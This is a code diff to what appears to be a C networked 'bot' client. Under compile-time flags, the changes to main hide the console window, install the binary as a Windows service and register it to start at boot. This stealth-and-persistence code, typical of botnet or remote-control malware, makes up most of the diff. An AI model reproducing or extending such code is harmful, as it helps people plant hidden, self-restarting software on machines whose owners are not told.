@@ -38,6 +38,9 @@
  * include the folllowing
  */
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+#define _WIN32_WINNT 0x501
+
 /*
  * GetLastError() for
  * error checking
@@ -60,7 +63,9 @@
 
 #include "bot.h"
 
-void non_fatal (char *str) {
+char *prog_name;
+
+void non_fatal (const char *str) {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
     int err = 0;
@@ -75,7 +80,7 @@ void non_fatal (char *str) {
 #endif
 }
 
-void fatal (char *str) {
+void fatal (const char *str) {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
     int err = 0;
@@ -91,7 +96,47 @@ void fatal (char *str) {
     exit (EXIT_FAILURE);
 }
 
-int main (void) {
+int main (int argc, char *argv[]) {
+    /* 
+     * client options are
+     * here
+     * functions are in 
+     * install.c
+     */
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+    // no console window
+#if defined(WINDOW_STEALTH)
+
+    if (GetConsoleWindow() != NULL) {
+        FreeConsole();
+    }
+
+#endif
+
+    // install program as service
+#if defined(INSTALL_SERVICE)
+
+    // if already installed, skip
+    if (argv[1] != NULL && strcmp (argv[1], "-service") != 0) {
+        install_service (argv[0]);
+    }
+
+#endif
+
+#endif
+
+    // autorun on boot
+#if defined(INSTALL_STARTUP)
+
+    if (argv[1] != NULL && strcmp (argv[1], "-startup") != 0) {
+        install_startup (argv[0]);
+    }
+
+#endif
+
+    prog_name = argv[0];
+
     SOCKET s;
 
     pAccount account = new_account();
